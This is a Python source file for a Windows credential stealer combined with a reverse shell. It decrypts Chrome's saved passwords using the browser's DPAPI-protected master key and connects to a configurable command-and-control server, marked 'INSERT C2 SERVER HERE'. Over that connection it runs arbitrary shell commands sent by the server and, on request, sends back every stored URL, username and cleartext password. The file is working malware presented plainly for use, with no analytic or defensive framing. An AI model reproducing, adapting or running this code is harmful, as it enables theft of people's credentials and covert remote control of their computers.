import os
import json
import base64
import sqlite3
import win32crypt
from Cryptodome.Cipher import AES
import shutil
import socket
import os
import subprocess
import sys


# Constants
SERVER_HOST = "127.0.0.1" # INSERT C2 SERVER HERE
SERVER_PORT = 9998 # INSERT C2 PORT HERE
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase


def get_master_key():
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r") as f:
         local_state = f.read()
         local_state = json.loads(local_state)
     master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
     master_key = master_key[5:]  # removing DPAPI
     master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
     return master_key


def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
     return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass
    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        return "Chrome < 80"
 

def main():

    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()
    
    db_cleartext = ""
    passwords_cleartext = []
    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if len(username) > 0:
                row = "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n"
                db_cleartext += row
                if decrypted_password != "Chrome < 80" and decrypted_password not in passwords_cleartext:
                    passwords_cleartext.append(decrypted_password)
    except Exception as e:
        pass
    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass
    # separator string for sending 2 messages in one go
    SEPARATOR = "<sep>"

    # create the socket object
    s = socket.socket()

    # connect to the server
    s.connect((SERVER_HOST, SERVER_PORT))

    # get the current directory
    cwd = os.getcwd()
    s.send(cwd.encode())
    while True:

        # receive the command from the server
        command = s.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":

            # if the command is exit, just break out of the loop
            break
        elif splited_command[0].lower() == "cd":

            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:

                # if there is an error, set as the output
                output = str(e)
            else:

                # if operation is successful, empty message
                output = ""
        
        # Shows full chrome db [url, username, cleartext password]
        elif splited_command[0].lower() == "getdb":
            output = db_cleartext

        # Shows list of unique passwords 
        elif splited_command[0].lower() == "getpasswords":
            output = "\n".join(passwords_cleartext)
        else:

            # execute the command and retrieve the results
            output = subprocess.getoutput(command)

        # get the current working directory as output
        cwd = os.getcwd()

        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        #s.send(message.encode())
        s.send(message.encode())

    # close client connection
    s.close()

# main
if __name__ == '__main__':
    main()